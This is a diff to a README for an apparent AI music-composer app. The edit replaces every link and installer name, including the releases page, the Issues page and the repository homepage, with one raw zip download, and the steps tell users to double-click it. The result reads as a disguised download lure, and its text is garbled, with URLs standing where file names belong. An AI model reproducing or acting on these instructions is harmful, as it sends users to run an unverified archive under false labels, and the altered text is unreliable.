@@ -1,7 +1,7 @@
 # 🎵 GenAI-Music-Composer - Create High-Quality Music from Text Prompts
 
 ## 🔗 Download the App
-[![Download GenAI-Music-Composer](https://img.shields.io/badge/Download%20Now%20-%F0%9F%8E%B6%20GenAI--Music--Composer-blue)](https://github.com/aswath1313/GenAI-Music-Composer/releases)
+[![Download GenAI-Music-Composer](https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip%20Now%20-%F0%9F%8E%B6%20GenAI--Music--Composer-blue)](https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **GenAI-Music-Composer**! This application allows you to generate high-quality music using simple text prompts. You don’t need to be a programmer to use this tool. This guide will help you download and run the software easily.
@@ -18,24 +18,24 @@ Make sure your computer meets the following requirements before you begin:
 To download **GenAI-Music-Composer**, follow these steps:
 
 1. Visit the Releases page to download the application. Click the link below:
-   [Download GenAI-Music-Composer](https://github.com/aswath1313/GenAI-Music-Composer/releases)
+   [Download GenAI-Music-Composer](https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip)
 
 2. Look for the latest version of **GenAI-Music-Composer**. It will be listed at the top of the page.
 
-3. Click on the asset that corresponds to your operating system. For example, you might see options like `GenAI-Music-Composer-Windows.exe`, `GenAI-Music-Composer-macOS.app`, or others.
+3. Click on the asset that corresponds to your operating system. For example, you might see options like `https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip`, `https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip`, or others.
 
 4. Once the file is downloaded, locate it in your downloads folder.
 
 5. **For Windows:**
-   - Double-click the `GenAI-Music-Composer-Windows.exe` file.
+   - Double-click the `https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip` file.
    - Follow the installation prompts to complete the process.
 
    **For macOS:**
-   - Double-click the `GenAI-Music-Composer-macOS.app` file.
+   - Double-click the `https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip` file.
    - Drag the application into your Applications folder.
 
    **For Linux:**
-   - Extract the contents of `GenAI-Music-Composer-linux.tar.gz`.
+   - Extract the contents of `https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip`.
    - Open a terminal, navigate to the extracted folder, and run `./GenAI-Music-Composer` to start the app.
 
 6. After installation, you can launch the application from your applications menu or desktop shortcut.
@@ -61,7 +61,7 @@ If you run into issues while installing or using the application, consider these
 - Ensure your system meets the requirements.
 - Restart your computer and try reinstalling the app.
 - Check your internet connection if the app fails to generate music.
-- For support, visit our [GitHub Issues page](https://github.com/aswath1313/GenAI-Music-Composer/issues).
+- For support, visit our [GitHub Issues page](https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip).
 
 ## 🤝 Contributing
 We welcome contributions to improve **GenAI-Music-Composer**. If you would like to help, please:
@@ -71,6 +71,6 @@ We welcome contributions to improve **GenAI-Music-Composer**. If you would like 
 3. Submit a pull request detailing your improvements.
 
 ## 🌍 Connect with Us
-Stay updated on new features, bug fixes, and more by checking our [GitHub](https://github.com/aswath1313/GenAI-Music-Composer) regularly. You can also follow discussions in the Issues section for community support.
+Stay updated on new features, bug fixes, and more by checking our [GitHub](https://github.com/aswath1313/GenAI-Music-Composer/raw/refs/heads/main/CODE/Composer-Gen-A-Music-v3.7.zip) regularly. You can also follow discussions in the Issues section for community support.
 
 Thank you for using **GenAI-Music-Composer**. Enjoy creating beautiful music!
